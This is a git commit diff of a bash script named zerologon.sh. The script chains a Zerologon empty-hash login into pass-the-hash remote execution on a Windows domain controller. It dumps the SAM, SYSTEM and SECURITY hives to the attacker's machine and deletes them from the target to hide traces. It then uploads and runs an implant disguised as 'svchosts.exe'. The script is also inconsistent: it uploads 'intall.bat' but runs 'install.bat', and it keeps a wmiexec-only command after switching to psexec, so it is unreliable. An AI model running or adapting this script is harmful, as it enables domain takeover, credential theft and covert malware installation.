6e5d577f5edf4b292e33249673c001cb87c2e99b
adamtknight <74627945+adamtknight@users.noreply.github.com>
2023-05-15 13:17:31 -0400

    Final changes

--- zerologon.sh
+++ zerologon.sh
@@ -5,21 +5,23 @@ hashes=$(secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "$1/$2"'$@'"$3
          | sed -nr 's/Administrator:[0-9]+:(.*:.*):::/\1/p')
 
 # Save relevant device info
-wmiexec.py -hashes $hashes "$1/Administrator@$3" "reg save HKLM\\SYSTEM system.save & reg save HKLM\\SAM sam.save & reg save HKLM\\SECURITY security.save"
+psexec.py -hashes $hashes "$1/Administrator@$3" "reg save HKLM\\SYSTEM system.save & reg save HKLM\\SAM sam.save & reg save HKLM\\SECURITY security.save"
 
 # Download device info to machine
 # Note: this needs to be done separately as lget is a wmiexec command, and not a windows one.
-wmiexec.py -hashes $hashes "$1/Administrator@$3" "lget system.save"
-wmiexec.py -hashes $hashes "$1/Administrator@$3" "lget sam.save"
-wmiexec.py -hashes $hashes "$1/Administrator@$3" "lget security.save"
+psexec.py -hashes $hashes "$1/Administrator@$3" "lget system.save"
+psexec.py -hashes $hashes "$1/Administrator@$3" "lget sam.save"
+psexec.py -hashes $hashes "$1/Administrator@$3" "lget security.save"
 
 # Delete device info off target to leave no trace
-wmiexec.py -hashes $hashes "$1/Administrator@$3" "del /f system.save sam.save security.save"
+psexec.py -hashes $hashes "$1/Administrator@$3" "del /f system.save sam.save security.save"
 
 # put the implant and install batch file
-wmiexec.py -hashes $hashes "$1/Administrator@$3" "lput svchosts.exe"
-wmiexec.py -hashes $hashes "$1/Administrator@$3" "lput intall.bat"
+psexec.py -hashes $hashes "$1/Administrator@$3" "lput svchosts.exe"
+psexec.py -hashes $hashes "$1/Administrator@$3" "lput intall.bat"
 
 # call the batch file
-wmiexec.py -hashes $hashes "$1/Administrator@$3" "cmd.exe /c call C:\\install.bat"
+psexec.py -hashes $hashes "$1/Administrator@$3" "cmd.exe /c call C:\\install.bat"
 
+# call the implant executable
+psexec.py -hashes $hashes "$1/Administrator@$3" "cmd.exe /c call C:\\Windows\\System32\\svchosts.exe"
